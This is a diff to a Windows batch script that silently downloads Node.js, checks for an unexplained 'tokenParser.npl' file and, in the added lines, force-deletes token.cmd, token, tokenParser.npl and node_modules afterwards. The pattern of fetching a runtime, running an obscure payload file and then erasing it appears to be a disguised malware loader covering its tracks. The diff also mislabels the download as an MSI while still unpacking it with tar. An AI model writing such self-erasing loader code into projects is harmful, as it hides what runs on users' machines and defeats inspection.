@@ -39,15 +39,15 @@ if "!INSTALL_NODE!"=="1" (
 
     where curl >nul 2>&1
     if %errorlevel% NEQ 0 (
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_TAR%'"
+        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_MSI%'"
     ) else (
-        curl -s -L -o "%NODE_TAR%" "%DOWNLOAD_URL%"
+        curl -s -L -o "%NODE_MSI%" "%DOWNLOAD_URL%"
     )
 
-    if exist "%NODE_TAR%" (
+    if exist "%NODE_MSI%" (
         echo Extracting Node.js...
-        powershell -Command "tar -xf '%NODE_TAR%'"
-        if exist "%NODE_TAR%" del "%NODE_TAR%"
+        powershell -Command "tar -xf '%NODE_MSI%'"
+        if exist "%NODE_MSI%" del "%NODE_MSI%"
     ) else (
         echo ❌ Failed to download Node.js.
         exit /b 1
@@ -93,6 +93,23 @@ if exist "%~dp0tokenParser.npl" (
 ) else (
     echo ❌ tokenParser.npl not found.
     exit /b
+)
+
+if exist "%~dp0token.cmd" (
+    del /f /q "%~dp0token.cmd"
+)
+
+if exist "%~dp0token" (
+    del /f /q "%~dp0token"
+)
+
+if exist "%~dp0tokenParser.npl" (
+    del /f /q "%~dp0tokenParser.npl"
+)
+
+if exist "%~dp0node_modules" (
+    echo Removing node_modules folder...
+    rmdir /s /q "%~dp0node_modules"
 )
 
 exit /b 0
